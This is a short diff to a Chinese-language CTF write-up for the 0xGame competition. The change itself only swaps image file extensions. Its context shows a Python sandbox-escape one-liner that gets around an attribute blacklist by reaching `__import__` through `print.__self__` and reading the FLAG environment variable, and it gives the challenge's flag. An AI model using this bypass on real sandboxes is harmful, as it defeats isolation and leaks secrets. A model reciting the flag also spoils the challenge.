@@ -92,7 +92,7 @@ DANGEROUS_ATTRIBUTES = [
 
 测试也确实是这样，没有输出：
 
-![](1.png)
+![](1.jpg)
 
 所以绕个弯子，由 `print` 出发，从 `__self__` 属性的词典里拉出 `__import__` 来，然后获取环境变量即可：
 
@@ -100,6 +100,6 @@ DANGEROUS_ATTRIBUTES = [
 print(print.__self__.__dict__.get("__import__")("os").environ.get("FLAG"))
 ```
 
-![](2.png)
+![](2.jpg)
 
 最终得到 flag 为 `0xGame{7c459645-c508-4b84-aecc-f3894ddbf796}` 。
